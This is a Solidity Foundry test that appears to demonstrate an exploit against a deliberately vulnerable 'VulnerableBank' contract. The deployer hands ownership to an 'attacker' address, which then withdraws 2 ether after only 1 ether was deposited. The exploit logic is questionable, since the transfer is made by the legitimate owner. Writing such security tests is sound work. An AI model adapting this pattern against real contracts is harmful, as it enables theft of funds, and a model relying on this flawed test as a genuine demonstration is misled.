// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract TestVulnerableBank is BaseTestWithBalanceLog {
    VulnerableBank target;
    address deployedWallet;

    function setUp() public {
        deployedWallet = makeAddr("deployed_wallet");
        target = new VulnerableBank();
        vm.startPrank(deployedWallet);
        target.deposit{value: 1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        address attacker = makeAddr("attacker");

        // Step 1: Transfer ownership to the attacker
        vm.startPrank(deployedWallet);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Validation: Check if ownership is transferred successfully
        assertEq(target.owner(), attacker);

        // Exploit: Withdraw funds as the attacker
        vm.prank(attacker);
        target.withdraw(2 ether);
    }
}